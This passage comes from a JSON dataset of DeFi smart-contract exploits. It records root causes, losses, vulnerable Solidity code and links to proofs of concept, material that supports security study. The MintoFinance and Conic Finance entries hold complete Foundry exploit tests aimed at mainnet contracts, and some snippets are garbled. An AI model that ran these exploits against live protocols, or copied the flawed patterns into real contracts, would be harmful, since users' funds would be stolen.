payable(TEAM).transfer(address(this).balance);\n}\n"
    },
    {
        "type": "Flashloans, Reward",
        "date": "20230510",
        "lost": "$197k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SNK_exp.sol",
        "title": "SNK",
        "root_cause": "Phalcon: The attacker exploits the `bindParent` function in contract SNKMiner to amplify his staking rewards. Specifically, this function binds one account as a staking account's child.\n\nSNKMiner depends on SNK balance of staking accounts' children to calculate the amount of reward(SNK) distributing to staking accounts. As a result, the attacker leverages flashloan to increase the SNK balance of children, which can further lift their parents' staking rewards.\n\nKALOS: The vulnerability lies in the bindParent() and getReward() functions. The bindParent() function allows setting the parent and child nodes, while the dynamicEarned() function within the getReward() function calculates rewards based on the balances of those child nodes. As a result, it is possible to receive a much larger amount of rewards than what should actually be obtained.",
        "attack_tx": "https://bscscan.com/address/0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee#code",
        "analysis": [
            "https://twitter.com/Phalcon_xyz/status/1656176776425644032",
            "https://twitter.com/kalos_security/status/1668092691262091265"
        ],
        "vulnerable_code_snippet": "function getReward() public updateReward(msg.sender) checkStart {\n    uint256 reward = dynamicEarned(msg.sender) + privateEarned(msg.sender); // vulnerable point\n    if (reward > 0) {\n        prewards[msg.sender] = 0;\n        drewards[msg.sender] = 0;\n\n        token.safeTransfer(msg.sender, reward);\n\n        totalRewards = totalRewards.add(reward);\n    }\n}\n\nfunction privateEarned(address account) public view returns (uint256) {\n    if (block.timestamp < starttime) {\n        return 0;\n    }\n\n    return\n        balanceOf(account)\n            .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n            .mul(35)\n            .div(precision)\n            .div(100)\n            .add(prewards[account]);\n}\n\nfunction dynamicEarned(address account) public view returns (uint256) {\n    if (block.timestamp < starttime) {\n        return 0;\n    }\n\n    if (balanceOf(account) < 10e18) {\n        return 0;\n    }\n    \n    return\n        _getMyChildersBalanceOf(account)\n            .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n            .mul(45)\n            .div(precision)\n            .div(100)\n            .add(drewards[account]);\n}\n\nfunction _getMyChildersBalanceOf(address user) private view returns (uint256) {\n    address[] memory childers = inv.getInviterSuns(user);\n\n    uint256 totalBalances;\n    for (uint256 index = 0; index < childers.length; index++) {\n        totalBalances += balanceOf(childers[index]); // vulnerable point\n    }\n\n    return totalBalances;\n}\n"
    },
    {
        "type": "Oracle, Under/Overflow, staking",
        "date": "20220320",
        "title": "Umbrella Network",
        "root_cause": "Arithmetic Overflow",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220320-umbrella-network---underflow",
        "vulnerable_code": "[https://etherscan.io/address/0xb3fb1d01b07a706736ca175f827e4f56021b85de#code#F1#L258](https://etherscan.io/address/0xb3fb1d01b07a706736ca175f827e4f56021b85de#code#F1#L258)",
        "analysis": "The vulnerable code snippet shows a function `_withdraw` that calculates the updated total supply and user balance by subtracting the withdrawal amount. However, it does not use safe math functions to prevent arithmetic overflow. This vulnerability allows an attacker to manipulate the balance values and potentially drain funds from the contract.",
        "vulnerable_code_snippet": "/// @param amount tokens to withdraw\n/// @param user address\n/// @param recipient address, where to send tokens, if we migrating token address can be zero\nfunction _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {\n    require(amount != 0, \"Cannot withdraw 0\");\n\n    // not using safe math, because there is no way to overflow if stake tokens not overflow\n    _totalSupply = _totalSupply - amount;\n    _balances[user] = _balances[user] - amount;  // vulnerable point, overflow\n    // not using safe transfer, because we working with trusted tokens\n    require(stakingToken.transfer(recipient, amount), \"token transfer failed\");\n\n    emit Withdrawn(user, amount);\n}\n"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20230523",
        "lost": "36K USD",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/LFI_exp.sol",
        "title": "LFI Token",
        "root_cause": "There is no time lock for the user 'staking' amount(balance).",
        "attack_tx": "https://polygonscan.com/tx/0xa0480d0f7c8d8bf898cadde954e773ddc3740f1ffa31cdd98fe4c5f5d8266243",
        "analysis": "https://twitter.com/AnciliaInc/status/1660767088699666433",
        "vulnerable_code_snippet": "function claimRewards(address to) external {\n    require(to != address(0), \"HOUSEPOOL:to address can't be zero\");\n    cleanUserMapping();\n    FarmInfo memory farm = updateFarm();\n    UserInfo storage user = userInfo[msg.sender];\n    int256 accumulatedReward = int256(   // vulnerable point: no time lock check\n        (balance0f(msg.sender) * farm.accRewardsPerShare) /\n            ACC_REWARD_PRECISION\n    );\n\n    uint256 _pendingReward = uint256(accumulatedReward - user.rewardDebt);\n    pendingRewards[msg.sender] = 0;\n    user.rewardDebt = accumulatedReward;\n    bool success = ILFIToken(STAKED_TOKEN).transfer(to, _pendingReward);\n\n    if (success) {\n        emit RewardsClaimed(msg.sender, to, _pendingReward);\n    } else {\n        revert();\n    }\n}\n"
    },
    {
        "type": "Unchecked User Input",
        "date": "20230723",
        "title": "MintoFinance",
        "root_cause": "The root cause is the design of the contract, which was set up to accept payment using a token address provided by the user, which in this case gave the attacker room to exploit.\n\nThe attacker targeted the vulnerable buyTokens() function, which accepts two structs as arguments: LinkParameters and PurchaseParameters.\n\nThe PurchaseParameters struct handles important transaction details such as the amount of tokens the user is purchasing and the payment token used.\n\nOnce the _buy() function was invoked by the buyTokens() function, the contract address for the paymentToken was sourced from the user-provided purchaseParams data, allowing the attacker to set it to their own malicious contract which imitates a legitimate ERC20 token.\n\nWhen the Minto contract sought to facilitate the repayment, it was misled into trading genuine BTCMT tokens for worthless imitation tokens created by the attacker, completing the attack.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x53be95dc8ffbc80060215133f76f48df35deef3cd7e1803e24b1e2f8aa53440b",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/MintoFinance_exp.sol",
        "analysis": "https://twitter.com/bbbb/status/1683180340548890631?s=20",
        "vulnerable_code_snippet": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\ninterface ReferalCrowdSales {\n    struct LinkParameters {\n        bytes32 linkHash;\n        address linkFather;\n        address linkSon;\n        uint256 fatherPercent;\n        bytes linkSignature;\n    }\n\n    struct PurchaseParameters {\n        bool give;\n        bool lockedPurchase;\n        address paymentToken;\n        uint256 usdtAmount;\n        uint256 btcmtAmount;\n        uint256 lockIndex;\n        uint256 expirationTime;\n        bytes buySignature;\n    }\n\n    function buyTokens(LinkParameters memory linkParams, PurchaseParameters memory purchaseParams) external;\n}\n\ninterface PancakeRouter3 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);\n}\n\ncontract MintoFinance_exp is Test {\n    address constant BUSD = 0x55d398326f99059fF775485246999027B3197955; //correct\n    IERC20 BTCMT;\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 30_214_253);\n        BTCMT = IERC20(0x410a56541bD912F9B60943fcB344f1E3D6F09567);\n    }\n\n    function testExploit() external {\n        console.log(\"BTCMT balance before the Exploit\", BTCMT.balanceOf(address(this)));\n        ReferalCrowdSales.LinkParameters memory linkParams;\n        ReferalCrowdSales.PurchaseParameters memory purchaseParams;\n        linkParams.linkHash = 0xc69c51e039668f688f28f427c63cd60aa986f8ce1546039e6a302fb721473814;\n        linkParams.linkFather = 0x0000000000000000000000000000000000000000;\n        linkParams.linkSon = 0x0000000000000000000000000000000000000000;\n        linkParams.fatherPercent = 0;\n        linkParams.linkSignature = \"\";\n        purchaseParams.give = false;\n        purchaseParams.lockedPurchase = false;\n        purchaseParams.paymentToken = address(this);\n        purchaseParams.usdtAmount = 12_100e18;\n        purchaseParams.btcmtAmount = 0;\n        purchaseParams.expirationTime = 0;\n        purchaseParams.buySignature = \"\";\n\n        ReferalCrowdSales(0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5).buyTokens(linkParams, purchaseParams);\n        uint256 balance = BTCMT.balanceOf(address(this));\n        console.log(\"BTCMT balance after the Exploit\", balance);\n        console.log(\"Swap BTCMT -> BUSD through pancakeSwap\");\n        BTCMT.approve(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4, type(uint256).max);\n\n        PancakeRouter3.ExactInputSingleParams memory inputparams;\n        inputparams.tokenIn = address(BTCMT);\n        inputparams.tokenOut = BUSD;\n        inputparams.fee = uint24(100);\n        inputparams.recipient = address(this);\n        inputparams.amountIn = balance;\n        inputparams.amountOutMinimum = uint256(0);\n        inputparams.sqrtPriceLimitX96 = uint160(0);\n        PancakeRouter3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4).exactInputSingle(inputparams);\n        uint256 bUSDBalance = IERC20(BUSD).balanceOf(address(this));\n        console.log(\"BUSD balance after the Exploit\", bUSDBalance);\n    }\n\n    function transferFrom(address a, address b, uint256 amount) external returns (bool) {\n        return true;\n    }\n}\n"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240306",
        "title": "ALP",
        "root_cause": "The `_swap()` is public which should be internal",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/bsc/0x9983ca8eaee9ee69629f74537eaf031272af75f1e5a7725911d8b06df17c67ca",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ALP_exp.sol",
        "analysis": "https://twitter.com/0xNickLFranklin/status/1765296663667875880",
        "Lost": "10K",
        "vulnerable_code_snippet": "function _swap(\n    IERC20 tokenForSwap,\n    bytes memory aggregatorData\n) public returns (uint256) {\n    SafeERC20.forceApprove(\n        tokenForSwap,\n        oneInchAggregatorAddress,\n        tokenForSwap.balanceOf(address(this))\n    );\n    // slither-disable-next-line Low-Level-Calls\n    (bool succ, bytes memory data) = address(oneInchAggregatorAddress).call(\n        aggregatorData\n    );\n    require(\n        succ,\n        \"Aggregator failed to swap, please update your block_number when running hardhat test\"\n    );\n    return abi.decode(data, (uint256));\n}\n"
    },
    {
        "type": "Reentrancy",
        "date": "20230722",
        "title": "Conic Finance 02",
        "root_cause": "Incorrect assumption about the address returned by the Curve element registry for ETH as the underlying for the Curve v2 pool.\nSpecifically, the Conic ETH Omnipool uses the `CurveHandlerV3` to check whether we are currently in a reentrant call. This check was only executed if the pool being interacted with contains ETH, which was checked by calling the `_isETH` method. Our assumption was that Curve v2 pools using ETH have the ETH address (`0xeee\u2026eee`) as one of their coins. However, they instead have the WETH address. This led to `_isETH` returning false, and in turn, to the reentrancy guard of the rETH pool being bypassed.\nAfter bypass the check, attacker can manipulate the price of rETH Curve LP Token.",
        "attack_tx": "https://etherscan.io/tx/0x37acd17a80a5f95728459bfea85cb2e1f64b4c75cf4a4c8dcb61964e26860882",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Conic02_exp.sol",
        "analysis": "https://twitter.com/spreekaway/status/1682467603518726144",
        "vulnerable_code_snippet": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\ninterface IConicPool {\n    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);\n\n    function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);\n}\n\ninterface IcrvUSDController {\n    function create_loan(uint256 collateral, uint256 debt, uint256 N) external payable;\n\n    function repay(uint256 _d_debt, address _for, int256 max_active_band, bool use_eth) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);\n    IERC20 cncCRVUSD = IERC20(0xB569bD86ba2429fd2D8D288b40f17EBe1d0f478f);\n    IConicPool ConicPool = IConicPool(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f);\n    IcrvUSDController crvUSDController = IcrvUSDController(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);\n    ICurvePool crvUSD_USDT_Pool = ICurvePool(0x390f3595bCa2Df7d23783dFd126427CCeb997BF4);\n    ICurvePool crvUSD_USDC_Pool = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);\n    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_743_470);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(crvUSD), \"crvUSD\");\n        vm.label(address(cncCRVUSD), \"cncCRVUSD\");\n        vm.label(address(ConicPool), \"ConicPool\");\n        vm.label(address(crvUSDController), \"crvUSDController\");\n        vm.label(address(crvUSD_USDT_Pool), \"crvUSD_USDT_Pool\");\n        vm.label(address(crvUSD_USDC_Pool), \"crvUSD_USDC_Pool\");\n        vm.label(address(Balancer), \"Balancer\");\n    }\n\n    function testExploit() external {\n        USDC.approve(address(crvUSD_USDC_Pool), type(uint256).max);\n        address(USDT).call(\n            abi.encodeWithSignature(\"approve(address,uint256)\", address(crvUSD_USDT_Pool), type(uint256).max)\n        );\n        WETH.approve(address(crvUSDController), type(uint256).max);\n        crvUSD.approve(address(crvUSDController), type(uint256).max);\n        crvUSD.approve(address(crvUSD_USDC_Pool), type(uint256).max);\n        crvUSD.approve(address(crvUSD_USDT_Pool), type(uint256).max);\n        crvUSD.approve(address(ConicPool), type(uint256).max);\n\n        address;\n        tokens;\n        amounts[0] = 12_000_000 * 1e6;\n        amounts[1] = 80_000 ether;\n        amounts[2] = 9_000_000 * 1e6;\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"Attacker crvUSD balance after exploit\", crvUSD.balanceOf(address(this)), crvUSD.decimals()\n        );\n    }\n\n    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        crvUSDController.create_loan(80_000 ether, 93_000_000 ether, 10); // deposit WETH, borrow crvUSD\n\n        crvUSDToUSDCAndUSDT(19_000_000 ether, 27_000_000 ether); // swap crvUSD to USDT and USDC, crvUSD price reduction\n        ConicPool.deposit(crvUSD.balanceOf(address(this)), 0, false); // deposit crvUSD to ConicPool, add crvUSD to crvUSD_USDT_Pool and crvUSD_USDC_Pool, crvUSD prices reduced further\n        USDCAndUSDTTocrvUSD(USDC.balanceOf(address(this)), USDT.balanceOf(address(this))); // swap USDC and USDT to crvUSD, crvUSD prices increased, earn more crvUSD\n        ConicPool.withdraw(cncCRVUSD.balanceOf(address(this)), 0); // withdraw cncCRVUSD from ConicPool, remove crvUSD from crvUSD_USDT_Pool and crvUSD_USDC_Pool, crvUSD prices increased\n\n        sandWich();\n        sandWich();\n        sandWich();\n\n        crvUSD_USDT_Pool.exchange(1, 0, 9_000_000 ether, 0); // swap crvUSD to USDT\n        crvUSD_USDC_Pool.exchange(1, 0, 12_000_000 ether, 0); // swap crvUSD to USDC\n        USDC.transfer(address(Balancer), amounts[0] + feeAmounts[0]);\n        address(USDT).call(\n            abi.encodeWithSignature(\"transfer(address,uint256)\", address(Balancer), amounts[2] + feeAmounts[2])\n        );\n\n        crvUSD_USDT_Pool.exchange(0, 1, USDT.balanceOf(address(this)), 0); // swap USDT to crvUSD\n        crvUSD_USDC_Pool.exchange(0, 1, USDC.balanceOf(address(this)), 0); // swap USDC to crvUSD\n        crvUSDController.repay(93_000_000 ether, address(this), int256(2 ** 255 - 1), false);\n        WETH.transfer(address(Balancer), amounts[1]);\n    }\n\n    function crvUSDToUSDCAndUSDT(uint256 swapAmount1, uint256 swapAmount2) internal {\n        crvUSD_USDT_Pool.exchange(1, 0, swapAmount1, 0); // swap crvUSD to USDT\n        crvUSD_USDC_Pool.exchange(1, 0, swapAmount2, 0); // swap crvUSD to USDC\n    }\n\n    function USDCAndUSDTTocrvUSD(uint256 swapAmount1, uint256 swapAmount2) internal {\n        crvUSD_USDC_Pool.exchange(0, 1, swapAmount1, 0); // swap USDT to crvUSD\n        crvUSD_USDT_Pool.exchange(0, 1, swapAmount2, 0); // swap USDC to crvUSD\n    }\n\n    function sandWich() internal {\n        crvUSDToUSDCAndUSDT(28_000_000 ether, 39_000_000 ether);\n        ConicPool.deposit(crvUSD.balanceOf(address(this)), 0, false);\n        USDCAndUSDTTocrvUSD(USDC.balanceOf(address(this)), USDT.balanceOf(address(this)));\n        ConicPool.withdraw(cncCRVUSD.balanceOf(address(this)), 0);\n    }\n}\n"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240415",
        "title": "Chainge",
        "root_cause": "setReward without access control. Everyone can set reward.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Chainge_exp.sol",
        "vulnerable_code_snippet": "function setReward(\n    address rewardSender,\n    uint256 amount,\n    uint256 remain,\n    uint256 price\n) public {\n    if (reward[rewardSender].length == 0) {\n        rewardKeys.push(rewardSender);\n    }\n\n    reward[rewardSender].push(\n        RewardData(rewardSender, amount, remain, price, block.timestamp)\n    );\n    _totalRemainCnt += remain;\n}\n",
        "attack_tx": [
            "https://bscscan.com/tx/0xe15d6f7fa891c2626819209edf2d5ded6948310eaada067b400062aa022ce718",
            "https://app.blocksec.com/explorer/tx/bsc/0xe15d6f7fa891c2626819209edf2d5ded6948310eaada067b400062aa022ce718"
        ],
        "analysis": [
            "https://x.com/ChainAegis/status/1779809931962827055",
            "https://x.com/0xNickLFranklin/status/1779782276198682993"
        ],
        "lost": "200K"
    },
    {
        "type": "Under/Overflow",
        "date": "20240708",
        "lost": "$7k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/LW_exp.sol",
        "title": "LW",
        "root_cause": "compiler version is 0.76 and \"transferFrom\" doesn't check underflow.",
        "vulnerable_code": "https://bscscan.com/address/0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8#code#F1#L1",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x96a955304fed48a8fbfb1396ec7658e7dc42b7c140298b80ce4206df34f40e8d",
        "analysis": "https://x.com/0xNickLFranklin/status/1810245893490368820",
        "vulnerable_code_snippet": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.7.6;"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230602",
        "lost": "$40k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/NST_exp.sol",
        "title": "NST Simple Swap",
        "root_cause": "",
        "attack_tx": "https://polygonscan.com/tx/0xa1f2377fc6c24d7cd9ca084cafec29e5d5c8442a10aae4e7e304a4fbf548be6d",
        "analysis": ""
    },
    {
        "type": "Access Control, payment",
        "date": "20220902",
        "lost": "1,078 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220902-shadowfi---access-control",
        "title": "ShadowFi",
        "root_cause": "incorrect access control",
        "analysis": "Due to the public access of burn() method, an attacker burned 10.3M SDF in the pair and then sync'd the price.\n\nThen they swap 8.4 SDF for 1078 BNB (~$298.2K) and transfer to tornato",
        "vulnerable_code_snippet": "function burn(address account, uint256 _amount) public { //vulnerable point\n    _transferFrom(account, DEAD, _amount);\n\n    emit burnTokens(account, _amount);\n}" 
    },
    {
        "type": "Lack of permission control",
        "date": "20230618",
        "lost": "$125k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/ARA_exp.sol",
        "title": "ARA",
        "root_cause": "A bug in the contract's handling of permissions, the approved token does not limit the funds transferred from the caller for swap purposes.",
        "attack_tx": "https://bscscan.com/tx/0xd87cdecd5320301bf9a985cc17f6944e7e7c1fbb471c80076ef2d031cc3023b2",
        "analysis": null
    },
    {
        "attack_type": "Flash Loan Attack",
        "description": "An attacker exploited a vulnerability in the contract's interest calculation logic. The attacker borrowed a large amount of funds through a flash loan, invested them in the contract, and then immediately withdrew their principal plus interest before the interest was accurately calculated. This resulted in the attacker making a profit by exploiting the discrepancy between the intended interest calculation and the actual calculation performed.",
        "impact": "Financial Loss",
        "vulnerability": "Integer Overflow/Underflow, Incorrect Interest Calculation",
        "attack_tx": [
            "0x49bed801b9a9432728b1939951acaa8f2e874453d39c7d881a62c2c157aa7613",
            "0xa916674fb8203fac6d78f5f9afc604be468a514aa61ea36c6d6ef26ecfbd0e97"
        ],
        "source": "https://bscscan.com/tx/0x49bed801b9a9432728b1939951acaa8f2e874453d39c7d881a62c2c157aa7613",
        "reference": "https://twitter.com/BlockSecTeam/status/1615232012834705408"
    },
    {
        "type": "Insufficient validation",
        "date": "20221119",
        "lost": "$3k",
        "title": "AnnexFinance",
        "root_cause": "Missing validation on target token for the liquidator",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Annex_exp.sol",
        "attack_tx": "https://bscscan.com/tx/0x3757d177482171dcfad7066c5e88d6f0f0fe74b28f32e41dd77137cad859c777",
        "analysis": "1. The attacker prepares a new token and creates pool(add liquidity) for the new token\n2.  Invoke the swap function with new pair and trigger the liquidating process\n3. Since there is no limitation on the liquidate target, the attacker put the attack contract address for three times for the liquidate information:\n```solidity\naddress borrower, address repayAToken, address seizeAToken) = abi.decode(data, (address, address, address));\n```\n4. Since the `repayAToken` is the attacker's address, it will not use the allowance in the `liquidateBorrow`\n    ```solidity\n    IERC20(estuary).safeApprove(repayAToken, amount);\n    ```\n5. The attacker utilizes the allowance to remove funds from the `liquidator",
        "vulnerable_code_snippet": "function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) override external {\n        // Unpack parameters sent from the `liquidate` function\n        // NOTE: these are being passed in from some other contract, and cannot necessarily be trusted\n        (address borrower, address repayAToken, address seizeAToken) = abi.decode(data, (address, address, address));\n\n        address token0 = IPancakePair(msg.sender).token0();\n        address token1 = IPancakePair(msg.sender).token1();\n        require(msg.sender == IPancakeFactory(FACTORY).getPair(token0, token1));\n\n        if (repayAToken == seizeAToken) {\n            uint amount = amount0 != 0 ? amount0 : amount1; \n            address estuary = amount0 != 0 ? token0 : token1; //@note -> BNB\n\n            // Perform the liquidation\n            IERC20(estuary).safeApprove(repayAToken, amount);\n            ABep20(repayAToken).liquidateBorrow(borrower, amount, seizeAToken);\n\n            // Redeem aTokens for underlying ERC20\n            ABep20(seizeAToken).redeem(IERC20(seizeAToken).balanceOf(address(this)));\n\n            // Compute debt and pay back pair\n            IERC20(estuary).transfer(msg.sender, (amount * 1000 / 997) + 1);\n            return;\n        }\n\n        // ... (remaining code omitted for brevity)\n    }"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20230911",
        "title": "0x0DEX",
        "root_cause": "The 0x0DEX contract was exploited through parameter manipulation. It allows private fund transfers (ETH) via `deposit` and `withdraw` functions and added a `swapOnWithdrawal` function for private swaps of deposited funds. The `swapOnWithdrawal` function was exploited. The amount withdrawn, after fees, is set as `_lastWithdrawal` only when `withdrawalData.wType` is `WithdrawalType.Swap`. For normal withdrawals (`withdrawalType.Direct`), `_lastWithdrawal` isn't set. This oversight allowed exploitation: if Alice swaps 10 ETH (`withdrawalType.Swap`) and Bob swaps 0.1 ETH (`withdrawalType.Direct`), the `_lastWithdrawal` remains 10 ETH. Thus, Bob could receive 10 ETH worth of tokens instead of his intended 0.1 ETH.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/0x0DEX_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec",
        "analysis": "https://0x0ai.notion.site/0x0-Privacy-DEX-Exploit-25373263928b4f18b31c438b2a040e33",
        "Lost": "$61K",
        "vulnerable_code_snippet": "function swapOnWithdrawal(\n        address tokenOut,\n        address payable recipient,\n        uint256 relayerGasCharge, \n        uint256 amountOut,\n        uint256 deadline,\n        WithdrawalData memory withdrawalData\n    ) external {\n        require(recipient != address(0), \"ZERO_ADDRESS\");\n        \n        withdrawalData.wType = Types.WithdrawalType.Swap;\n        withdraw(\n            recipient, \n            withdrawalData,\n            relayerGasCharge\n        );\n\n        uint amountIn = _lastWithdrawal;\n        uint relayerFee = getRelayerFeeForAmount(amountIn);\n\n        address payable relayerAddress = IOxODexFactory(factory).relayerAddress();\n        (bool sent, ) = relayerAddress.call{value: relayerFee}(\"\");\n        require(sent, \"FAILED_TO_SEND_RELAYER_FEE\");\n\n        amountIn -= relayerFee;\n\n        IUniswapV2Router router = IUniswapV2Router(UNISWAP_V2_ROUTER);\n        address;\n        path[0] = WETH;\n        path[1] = tokenOut;\n\n        router.swapExactETHForTokens{value: amountIn}(\n            amountOut, \n            path, \n            recipient, \n            deadline\n        );\n        _lastWithdrawal = 0;\n        emit Swap(tokenOut, withdrawalData.amount, amountIn);\n    }" 
    },
    {
        "type": "Arbitrary call",
        "date": "20231024",
        "title": "MaestroRouter2",
        "root_cause": "The `0x9239127f` function in the Maestro Router 2 contract has an external call vulnerability. Attackers can pass in a token address and use the `transferFrom` function with the victim's and their own addresses to transfer the victim's tokens.",
        "lost": "$280ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/MaestroRouter2_exp.sol",
        "attack_tx": [
            "https://etherscan.io/tx/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92",
            "https://etherscan.io/tx/0xede874f9a4333a26e97d3be9d1951e6a3c2a8861e4e301787093cfb1293d4756",
            "https://etherscan.io/tx/0xe60c5a3154094828065049121e244dfd362606c2a5390d40715ba54699ba9da6",
            "https://etherscan.io/tx/0xf4ae22177c3abbb0f21defe51dd14eff68eb1b0c52ac4104186220138e8e5bb2",
            "https://etherscan.io/tx/0x6cba3a67d6b8de664d860b096c8c558a1d65e5fa9735c657ddc98f67969561a2",
            "https://etherscan.io/tx/0xddd1048fe3f2df1fb98e534a97173b32a9fca662dbd257a72725482431d3f25e",
            "https://etherscan.io/tx/0xffb4bd29825bdd41adf344028f759692021cbadc2d4cb5b587e68fd8285c5eb1",
            "https://etherscan.io/tx/0xa9948c8f0500a867091a090d1212de1e5b28e516434567113982fcac36ed9e1a4",
            "https://etherscan.io/tx/0x4f4d6909a442b4d86f79a9044dcada6a128ddd9f62c26f410134a72d2fc31389"
        ],
        "analysis": [
            "https://twitter.com/Phalcon_xyz/status/1717014871836098663",
            "https://twitter.com/BeosinAlert/status/1717013965203804457"
        ],
        "vulnerable_code_snippet":"function @x9239127f(uint256 varg0, bytes varg1, uint256 varg2, uint256 varg3) public payable {\n    require(~3 + msg.data.length >= 128);\n    require(!(address(varg1) - varg1));\n    require(varg1 <= uint64.max);\n    require(4 + varg1 + 31 < msg.data.length);\n    require(varg1.length <= uint64.max);\n    require(!(bool(varg3) - varg3));\n    require(!bool(msg.value < varg2), \"Tip can't be bigger than tx value\");\n    require(msg.value - varg2 <= msg.value, Panic(17)); // arithmetic overflow or underflow\n    v0 = v1 = 1789;\n    v2 = v2 = 5518;\n    CALLDATACOPY(v3.data, varg1.data, varg1.length);\n    MEM[v3.data + varg1.length] = 0;\n    v4 = v5 = varg0.call(v3.data).value(msg.value - varg2).gas(msg.gas);\n    v6 = v5;\n    v7 = v0;\n    if (varg3) {\n        ...\n    }\n}"
    },
    {
        "type": "DAO, Insufficient validation",
        "date": "20221021",
        "lost": "$292 K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/README.md#20221021-bond-protocol---no-input-validation",
        "title": "OlympusDAO",
        "root_cause": "insufficient validation",
        "vulnerable_code": "https://etherscan.io/address/0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156#code#F1#L137",
        "analysis": "Due to token_ is controllable and does not validate properly on BondFixedExpiryTeller, attacker can create a custom contract to drain out the fund on BondFixedExpiryTeller.",
        "update": "funds are returned to OlympusDAO.",
        "vulnerable_code_snippet" : "/// @inheritdoc IBondFixedExpiryTeller\n    function redeem(ERC20BondToken token_, uint256 amount_) external override nonReentrant {**//vulnerable point,** insufficient validation\n        if (uint48(block.timestamp) < token_.expiry())\n            revert Teller_TokenNotMatured(token_.expiry());\n        token_.burn(msg.sender, amount_);\n        token_.underlying().transfer(msg.sender, amount_); **//vulnerable point, custom contract return OHM.**\n    }"
    },
    {
        "type": "Unchecked User Input",
        "date": "20240117",
        "title": "BmiZapper",
        "root_cause": "The attacker exploited stale USDC approvals and a vulnerable zapToBMI function that accepts arbitrary bytes arguments and forwards them, enabling the exploit.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x97201900198d0054a2f7a914f5625591feb6a18e7fc6bb4f0c964b967a6c15f6",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/BmiZapper_exp.sol",
        "analysis": "https://x.com/0xmstore/status/1747756898172952725?s=20",
        "lost": "114K",
